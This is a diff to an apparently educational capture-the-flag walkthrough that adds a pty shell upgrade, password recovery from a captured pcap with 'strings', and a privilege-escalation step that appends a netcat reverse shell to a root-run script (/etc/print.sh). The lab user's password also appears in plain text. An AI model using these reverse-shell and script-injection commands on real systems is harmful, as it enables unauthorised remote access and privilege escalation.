@@ -105,6 +105,7 @@ create listener and open file on browser
 
 ```
 nc -vlnp 1234
+python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ![image](https://user-images.githubusercontent.com/90561566/202403261-dc874bcd-546b-431a-9da8-364ccfa5054a.png)
@@ -125,6 +126,8 @@ cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
 
 ![image](https://user-images.githubusercontent.com/90561566/202405450-17aa3512-4d2e-4c2e-90f1-f0a7f801dd0e.png)
 
+![image](https://user-images.githubusercontent.com/90561566/202652583-89a53d9d-01f1-440f-a574-edefe8a19a67.png)
+
 ## Cracking
 
 open captured file with wireshark
@@ -141,13 +144,24 @@ our concern should be http protocol, i see someone has request a web shell in th
 
 let's take a look at tcp traffic 4444 dump it all out to plain text
 
-![image](https://user-images.githubusercontent.com/90561566/202410068-a0519b4a-9b8d-42cf-9460-3c5574d8dd68.png)
+![image](https://user-images.githubusercontent.com/90561566/202653302-a4cf17c3-b7a9-4d46-8cbc-3461e8e3e445.png)
 
 after lookup, i can see here is the password for lennie
 
 ![image](https://user-images.githubusercontent.com/90561566/202412311-520555ec-70b3-4438-8657-bacbe2c1416d.png)
 
-login with `c4ntg3t3n0ughsp1c3`
+or you can use `strings` if you don't familiar with wireshark
+
+```
+strings suspicious.pcapng
+```
+
+![image](https://user-images.githubusercontent.com/90561566/202652851-4eeee1dc-69fb-4cba-92f1-594b6ae0376e.png)
+
+```
+su lennie
+c4ntg3t3n0ughsp1c3
+```
 
 ![image](https://user-images.githubusercontent.com/90561566/202412520-ce00699b-cca7-4cd4-9f3a-74a7996e6aa5.png)
 
@@ -173,7 +187,9 @@ it also run a file with lennie permission
 
 ![image](https://user-images.githubusercontent.com/90561566/202415242-39b20879-3392-446a-a212-7e1e929e9b92.png)
 
-
+```
+echo "nc 10.8.0.74 4444 -e /bin/sh" >> /etc/print.sh
+```
 
 
 | Flag | root.txt |
